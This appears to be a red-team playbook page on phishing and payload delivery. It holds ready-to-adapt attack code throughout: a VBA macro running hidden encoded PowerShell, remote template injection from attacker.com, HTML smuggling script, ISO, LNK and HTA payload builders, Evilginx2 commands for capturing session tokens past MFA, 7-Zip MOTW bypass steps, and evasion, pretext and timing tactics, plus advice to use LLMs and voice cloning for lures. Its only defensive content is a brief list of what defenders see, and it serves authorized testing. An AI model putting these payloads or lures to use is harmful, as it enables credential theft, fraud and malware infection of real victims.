# Phishing & Payload Delivery

> **MITRE ATT&CK**: Initial Access > T1566 - Phishing
> **Platforms**: Windows, macOS, Linux (primarily Windows)
> **Required Privileges**: None (social engineering)
> **OPSEC Risk**: Medium-High (payloads may be submitted to sandboxes; infrastructure is trackable)

## Strategic Overview

Phishing remains the most effective initial access vector because it targets the weakest
link: human judgment. For the Red Team Lead, phishing is not just about sending malicious
emails -- it is an orchestrated operation combining infrastructure setup, payload
development, pretext engineering, and delivery timing. The landscape has shifted
significantly: Microsoft now blocks VBA macros by default in documents downloaded from the
internet (Mark-of-the-Web), forcing operators to adopt alternative payload formats. Modern
phishing operations leverage HTML smuggling, ISO/IMG containers, LNK files, OneNote
payloads, and transparent proxy frameworks like Evilginx2 for MFA bypass. The Red Team
Lead must understand both the technical payload chain and the social engineering psychology
that makes a target click. A perfect payload with a poor pretext fails; a mediocre payload
with a compelling pretext succeeds.

## Technical Deep-Dive

### VBA Macro Payloads (Legacy but Relevant)

```vba
' Classic VBA macro payload - runs on document open
' NOTE: Blocked by default since 2022 for internet-downloaded files
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -nop -w hidden -enc " & encodedPayload
    Shell cmd, vbHide
End Sub

' Bypass: Remove MOTW by delivering via ISO/IMG container
' Bypass: Deliver via SharePoint/OneDrive (trusted location)
' Bypass: Use template injection - document fetches macro-enabled template
```

### Template Injection (MOTW-Aware)

```xml
<!-- .docx file with remote template reference -->
<!-- Modify word/_rels/settings.xml.rels -->
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="https://attacker.com/template.dotm" TargetMode="External"/>

<!-- The .docx itself has no macros (clean), but fetches a macro-enabled template -->
<!-- Template is loaded from a "trusted" remote location -->
```

### HTML Smuggling

```html
<!-- HTML smuggling - constructs and downloads payload in-browser -->
<html>
<body>
<script>
// Base64-encoded payload (ISO, EXE, DLL, etc.)
var payload = "BASE64_ENCODED_PAYLOAD_HERE";
var binary = atob(payload);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});
var url = window.URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'Invoice-2024.iso';
document.body.appendChild(a);
a.click();
// Payload is constructed client-side, bypassing email gateway file inspection
</script>
</body>
</html>
```

### ISO/IMG Container Payloads

```bash
# ISO containers auto-mount in Windows and contents do NOT carry MOTW
# Create payload structure
mkdir iso_contents
cp payload.exe iso_contents/
cp decoy.lnk iso_contents/    # LNK pointing to payload.exe

# Generate ISO file
mkisofs -o Invoice.iso -J -r iso_contents/
# Or on Windows: oscdimg -n -d iso_contents Invoice.iso

# IMG files work similarly - auto-mount as virtual drives
# Payload execution chain: Email -> HTML Smuggling -> ISO -> LNK -> Payload
```

### LNK Shortcut Payloads

```bash
# PowerShell to create malicious LNK
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\temp\Report.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c powershell -nop -w hidden -enc ENCODED_PAYLOAD"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"  # Word doc icon
$lnk.WorkingDirectory = "C:\Windows\System32"
$lnk.Save()

# LNK files can also call mshta, rundll32, regsvr32, certutil
# Example: LNK -> mshta -> HTA with embedded VBScript -> payload
```

### HTA File Execution

```html
<!-- HTA file - executed by mshta.exe (HTML Application Host) -->
<html>
<head>
<script language="VBScript">
Sub RunPayload()
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -enc ENCODED_PAYLOAD", 0, False
    Close
End Sub
</script>
<hta:application id="app" applicationname="Update"
  border="none" showintaskbar="no" />
</head>
<body onload="RunPayload()">
<h2>Loading document...</h2>
</body>
</html>
```

### OneNote Payloads (.one Files)

```
# OneNote payload technique (emerged 2023 as macro alternative)
# 1. Create a OneNote document with embedded file attachment
# 2. Overlay the attachment icon with a "Click to view" image
# 3. Embedded file can be: .bat, .cmd, .hta, .vbs, .wsf
# 4. OneNote does NOT respect MOTW in the same way as Office docs

# Microsoft has since added warnings for embedded files in OneNote
# But the technique demonstrated the shift away from macro-based payloads
```

### Evilginx2 - MFA Bypass via Transparent Proxy

```bash
# Evilginx2 acts as a transparent reverse proxy between victim and legitimate site
# Captures session tokens in real-time, bypassing MFA entirely

# Setup Evilginx2
evilginx2 -p ./phishlets

# Configure phishlet for target service (e.g., O365)
config domain attacker-domain.com
config ip 1.2.3.4
phishlets hostname o365 login.attacker-domain.com
phishlets enable o365

# Create lure URL
lures create o365
lures get-url 0
# URL: https://login.attacker-domain.com/xyz123

# When victim authenticates through the proxy:
# 1. Credentials captured in cleartext
# 2. MFA token captured and replayed
# 3. Session cookie captured for direct access
# 4. Attacker gets authenticated session without triggering MFA again

sessions          # List captured sessions
sessions 1        # View session details including cookies
```

### GoPhish Campaign Infrastructure

```bash
# GoPhish - open-source phishing framework
# Setup sending profile (SMTP configuration)
# Configure email template with tracking pixel and payload link
# Create landing page (credential harvester or payload download)
# Define target group from OSINT-gathered email list
# Schedule campaign with appropriate send timing

# Best practices for red team phishing campaigns:
# - Register domain 30+ days before engagement (domain age reputation)
# - Configure SPF, DKIM, DMARC on sending domain
# - Use HTTPS on phishing pages (Let's Encrypt)
# - Categorize domain in web proxies (Bluecoat, McAfee) before use
# - Match email template formatting to target's actual email style
```

### Pretext Engineering

```
# High-success pretexts (based on engagement data):
# 1. IT department: "Password expiration notice" / "MFA re-enrollment required"
# 2. HR department: "Updated benefits package" / "Compensation review"
# 3. Executive: "Urgent: Board meeting documents" (authority pressure)
# 4. Vendor: "Invoice attached" / "Contract update requires signature"
# 5. Internal tool: "Shared document notification" (mimicking SharePoint/OneDrive)

# Timing considerations:
# - Monday mornings (backlog processing, less scrutiny)
# - End of quarter (financial pressure, invoice pretexts)
# - Avoid Friday afternoons (lower engagement rates)
# - Match target timezone for business hours delivery
```

## Detection & Evasion

### What Defenders See
- Email gateway flags known phishing indicators (suspicious URLs, attachment types)
- Sandbox detonation analyzes attachments for malicious behavior
- MOTW triggers SmartScreen and Protected View for downloaded files
- EDR monitors child process chains (Word -> cmd -> powershell)
- Network monitoring detects connections to uncategorized/new domains

### Evasion Techniques
- HTML smuggling bypasses email attachment scanning (payload built client-side)
- ISO/IMG containers strip MOTW from contents on mount
- Domain categorization makes phishing infrastructure appear legitimate
- Payload obfuscation (encoding, encryption, staged loading) evades AV/EDR
- Use legitimate cloud services (Azure, AWS) for payload hosting
- Signed binaries (DLL sideloading) bypass application whitelisting
- Delay payload execution to outlast sandbox analysis windows

### OPSEC Considerations
- Assume all payloads will be submitted to VirusTotal within hours
- Use unique payloads per target to prevent cross-engagement detection
- Separate phishing infrastructure from C2 infrastructure
- Monitor for beacon callbacks to confirm successful phishing

## 2025 Techniques

### Mark-of-the-Web (MOTW) Bypass Evolution

The MOTW bypass landscape expanded significantly in 2025-2026, providing operators with multiple new options for bypassing SmartScreen and Protected View without relying on ISO/IMG containers.

#### 7-Zip Double Compression Bypass (CVE-2025-0411)

```
# CVE-2025-0411 -- 7-Zip MOTW bypass (January 2025)
# Affects 7-Zip versions before 24.09
# MITRE: T1553.005

# Technique: Double-compress the payload (archive within an archive)
# MOTW flag is NOT propagated to inner files
# SmartScreen and MOTW-dependent protections completely bypassed

# Operational steps:
# 1. Package payload into inner.7z
# 7z a inner.7z payload.exe
# 2. Package inner.7z into outer.7z
# 7z a outer.7z inner.7z
# 3. Deliver outer.7z via email/web (MOTW applied to outer.7z)
# 4. Victim extracts outer.7z -> extracts inner.7z
# 5. payload.exe has NO MOTW flag -> no SmartScreen warning

# Exploited in the wild by multiple threat actors
# Extremely simple -- no additional exploitation required
```

#### WinRAR Symlink Bypass (CVE-2025-31334)

```
# CVE-2025-31334 -- WinRAR MOTW bypass via symlinks (April 2025)
# MITRE: T1553.005

# Technique: Craft archive containing a symlink pointing to an executable
# When symlink is launched from WinRAR shell, MOTW data is ignored

# Complements existing ISO/VHD and 7-Zip bypass techniques
# Requires WinRAR versions before 7.11
```

#### Windows Remote Assistance Bypass (CVE-2026-20824)

```
# CVE-2026-20824 -- Windows Remote Assistance MOTW bypass (2026)
# CVSS 5.5 -- Protection mechanism failure
# MITRE: T1553.005

# Bypass via native Windows utility
# Requires local execution and user interaction
# New MOTW bypass avenue through a legitimate Windows component
```

### HTML Smuggling via Cloudflare Workers

```
# Evolution of HTML smuggling using serverless infrastructure (2025)
# MITRE: T1027.006

# Traditional HTML smuggling constructs payloads in-browser (already in KB)
# NEW: Cloudflare Workers serve as serverless transparent proxies

# Advantages:
# - Trusted CDN infrastructure (*.workers.dev resolves to Cloudflare IPs)
# - Zero cost (Cloudflare Workers free tier)
# - Ephemeral execution with zero forensic footprint
# - Payload constructed via JavaScript Blobs and Base64 decoding
# - Bypasses firewalls, proxies, and email filters

# Campaign targets: Microsoft, Gmail, Yahoo, cPanel Webmail credentials
# Workers infrastructure operates on trusted CDN -- difficult to block
# without impacting legitimate Cloudflare-hosted services

# Red team application:
# Host AiTM proxy or credential harvester on Cloudflare Workers
# Combined with HTML smuggling for payload delivery through Workers
```

### Multi-Channel Phishing (Non-Email Vectors)

```
# Push Security 2025 research finding:
# ~1 in 3 phishing attacks detected were delivered OUTSIDE of email
# MITRE: T1566 (multiple sub-techniques)

# Top non-email phishing channels:
# 1. LinkedIn DMs -- trusted professional platform context
# 2. Google Search Ads -- malicious ads impersonating login pages
# 3. Microsoft Teams -- see office365-initial-access.md
# 4. Slack -- Scattered Spider infiltration (FBI 2025 warning)
# 5. Zoom/WebEx invite links

# 90% of phishing campaigns in 2025 utilized PhaaS kits (Push Security)

# Red team implication:
# Phishing assessments limited to email miss 1/3 of the attack surface
# Diversify delivery: LinkedIn InMail, Google Ads, Teams messages
```

### AI-Generated Phishing at Scale

```
# AI content is now the NORM for phishing (2025-2026)
# MITRE: T1566 (all sub-techniques)

# Statistics:
# - 82.6% of phishing emails contained AI-generated content (Hoxhunt)
# - AI-powered phishing achieves click rates up to 4x higher
# - 400% rise in successful phishing scams attributed to AI tools
# - Voice phishing surged 442% in 2025 (Group-IB)
# - Deepfake vishing surged 1,600% in Q1 2025 vs Q4 2024

# AI capabilities for phishing:
# - Hyper-personalized messages using OSINT-gathered intelligence
# - Real-time voice cloning from seconds of target audio (NCC Group)
# - Rapid generation of realistic fake websites
# - LLM-generated QR code lure text
# - AI-generated deepfake video for executive impersonation

# Notable incident:
# UNC6040 used cloned CFO voice to steal $12M from Canadian insurer

# Red team baseline:
# LLMs should be standard for lure generation
# Voice cloning tools for vishing engagements
# AI-personalized pretexts based on target's LinkedIn/social media
```

## Cross-References

- **M365 Initial Access** (02-initial-access/office365-initial-access.md) -- Teams phishing, SharePoint delivery, QR codes, BitB, AiTM platforms beyond Evilginx
- **Outlook Persistence** (04-persistence/outlook-persistence.md) -- Post-compromise persistence via malicious Outlook rules, forms, and folder home pages using Ruler
- **Passive Recon** (01-reconnaissance/passive-recon.md) -- OSINT builds target email lists and pretexts
- **Web Recon** (01-reconnaissance/web-recon.md) -- identifies login portals for Evilginx phishlets
- **Password Attacks** (02-initial-access/password-attacks.md) -- credential harvesting complements spraying
- **External Remote Services** (02-initial-access/external-remote-services.md) -- captured creds access VPN/RDP

## References

- MITRE ATT&CK T1566: https://attack.mitre.org/techniques/T1566/
- Evilginx2: https://github.com/kgretzky/evilginx2
- GoPhish: https://github.com/gophish/gophish
- HTML Smuggling: https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
- Microsoft Macro Blocking: https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked
- CVE-2025-0411 (7-Zip MOTW): https://www.malwarebytes.com/blog/news/2025/01/7-zip-motw-bypass-exploited-in-the-wild
- CVE-2025-31334 (WinRAR MOTW): https://www.helpnetsecurity.com/2025/04/07/winrar-motw-bypass-cve-2025-31334/
- Push Security Multi-Channel Research: https://pushsecurity.com/blog/
- AI Phishing Statistics: https://hoxhunt.com/blog/ai-generated-phishing-statistics-2025
